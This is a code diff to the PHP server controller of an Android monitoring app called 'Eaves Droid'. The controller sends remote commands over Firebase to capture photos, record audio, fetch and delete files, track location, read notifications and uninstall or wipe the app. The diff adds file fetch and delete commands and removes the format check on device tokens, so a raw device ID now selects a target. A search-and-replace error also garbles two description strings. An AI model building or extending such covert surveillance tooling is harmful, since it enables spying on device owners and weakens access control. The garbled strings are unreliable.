@@ -3,7 +3,7 @@
 namespace App\Controllers\api\v1;
 
 use App\Controllers\BaseController;
-use App\Models\Mod_Log_User_Action;
+use App\Models\LogUserActionModel;
 use CodeIgniter\API\ResponseTrait;
 
 class FCMCommandController extends BaseController
@@ -20,6 +20,7 @@ class FCMCommandController extends BaseController
 
     public function send($token = null, $command = null, $payload = 'all')
     {
+        $payload = $this->request->getPost('payload') ?? $this->request->getGet('payload') ?? $payload;
         if (!$token || !$command) {
             return $this->fail('Device token and command are required.', 400);
         }
@@ -28,7 +29,7 @@ class FCMCommandController extends BaseController
         $db = \Config\Database::connect();
 
         // 1. Try to treat as encrypted database ID (counter)
-        $crypt = new \App\Models\Mod_Crypt();
+        $crypt = new \App\Models\CryptModel();
         $decryptedCounter = $crypt->decrypt_id($token);
         if ($decryptedCounter && is_numeric($decryptedCounter)) {
             $device = $db->table('tbl_device_profiles')
@@ -41,8 +42,8 @@ class FCMCommandController extends BaseController
             }
         }
 
-        // 2. Try to treat as device checksum (64 char hex string)
-        if (!$fcmToken && strlen($token) === 64 && ctype_xdigit($token)) {
+        // 2. Try to treat as device ID / checksum
+        if (!$fcmToken) {
             $device = $db->table('tbl_device_profiles')
                 ->select('fcm_token')
                 ->where('device_id', $token)
@@ -71,6 +72,8 @@ class FCMCommandController extends BaseController
             'cmd_capture_photo'          => 'fcm_cmd_camera',
             'cmd_record_audio'           => 'fcm_cmd_audio',
             'cmd_files'                  => 'fcm_fetch_files',
+            'cmd_fetch_file'             => 'fcm_file_management',   // Platinum only
+            'cmd_delete_file'            => 'fcm_file_management',   // Platinum only
             'cmd_software_misc'          => 'fcm_fetch_soft_misc',
             'cmd_hardware_misc'          => 'fcm_fetch_hard_misc',
             'cmd_all'                    => 'fcm_fetch_all',
@@ -128,10 +131,44 @@ class FCMCommandController extends BaseController
                 'action_log_id' => $logId,
             ]);
         } else {
+            $errorBody = $result->error ?? null;
+            $errorCode = null;
+
+            // Extract FCM error code from the nested response
+            if (is_object($errorBody)) {
+                $errorCode = $errorBody->status ?? null; // e.g. "NOT_FOUND"
+                if (empty($errorCode) && !empty($errorBody->details)) {
+                    foreach ($errorBody->details as $detail) {
+                        if (!empty($detail->errorCode)) {
+                            $errorCode = $detail->errorCode; // e.g. "UNREGISTERED"
+                            break;
+                        }
+                    }
+                }
+            }
+
+            $isUnregistered = in_array($errorCode, ['UNREGISTERED', 'NOT_FOUND'], true)
+                           || (is_object($errorBody) && ($errorBody->message ?? '') === 'NotRegistered');
+
+            if ($isUnregistered) {
+                // Auto-clean the stale token so the device shows as offline
+                $db = \Config\Database::connect();
+                $db->table('tbl_device_profiles')
+                    ->where('fcm_token', $fcmToken)
+                    ->update(['fcm_token' => null]);
+
+                return $this->fail([
+                    'success'       => false,
+                    'message'       => 'Device is unreachable — the app may have been reinstalled or the device is no longer registered. The stale token has been cleared.',
+                    'error_code'    => 'UNREGISTERED',
+                    'action_log_id' => $logId,
+                ], 410); // 410 Gone — resource no longer available
+            }
+
             return $this->fail([
-                'success' => false,
-                'message' => 'FCM dispatch failed.',
-                'error' => $result->error ?? 'Unknown error',
+                'success'       => false,
+                'message'       => 'FCM dispatch failed.',
+                'error'         => $result->error ?? 'Unknown error',
                 'action_log_id' => $logId,
             ], 500);
         }
@@ -188,7 +225,7 @@ class FCMCommandController extends BaseController
     private function logCommandDispatch(string $token, string $command, string $payload, array $response, bool $success): int
     {
         try {
-            $logModel = new Mod_Log_User_Action();
+            $logModel = new LogUserActionModel();
             $request = service('request');
             $userId = null;
             if (function_exists('auth') && auth()->loggedIn()) {
@@ -456,7 +493,7 @@ return json_decode($response);
             'cmd_fetch_file' => 'Fetch Specific File',
             'cmd_location' => 'Fetch Location',
             'cmd_start_tracking' => 'Start Live Tracking',
-            'cmd_context' => 'Fetch Context (Activity + Location)',
+            'cmd_context' => 'Fetch Context (Activity + LocationController)',
             'cmd_apps' => 'Fetch Installed Apps',
             'cmd_usage' => 'Fetch App Usage Stats',
             'cmd_notifications' => 'Fetch Notifications',
@@ -513,7 +550,7 @@ return json_decode($response);
             'cmd_reset_app' => 'Resets the Eaves Droid app on the device to its initial state.',
             'cmd_deactivate' => 'Deactivates the Eaves Droid app, stopping all monitoring.',
             'cmd_reactivate' => 'Reactivates the Eaves Droid app, resuming all monitoring.',
-            'cmd_logout' => 'Logs out the current session on the device.',
+            'cmd_logout' => 'LogsController out the current session on the device.',
             'cmd_uninstall_preserve' => 'Uninstalls the app while preserving collected data on the server.',
             'cmd_uninstall_wipe' => 'Uninstalls the app and wipes all collected data from the device.',
             'cmd_update_prefs' => 'Updates device settings and preferences remotely.',
